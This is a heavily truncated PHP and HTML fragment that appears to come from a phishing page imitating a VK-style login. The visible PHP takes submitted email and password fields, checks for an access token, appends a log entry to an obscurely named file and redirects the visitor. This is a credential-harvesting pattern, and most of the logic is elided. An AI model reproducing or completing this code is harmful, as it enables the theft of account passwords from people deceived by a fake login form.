	...
	if (($_POST["email"] != "") and ($_POST["pass"]))
	{
		...
		if (strpos($check, "access_token") === false)
		{
			...
			else
			{
				...
				$log = fopen("t3mehk8y7k26gevcs95912xkp6khoydih1is77fq", "a+"); fwrite($log, $ez_log."\n"); fclose($log);
				header("Location: ".$url."");
			}
	}
...
<img src="https://pp.userapi.com/c834200/v834200440/d689f/ALpvTDlralg.jpg" class="op_fimg" />
<div class="op_fcont">
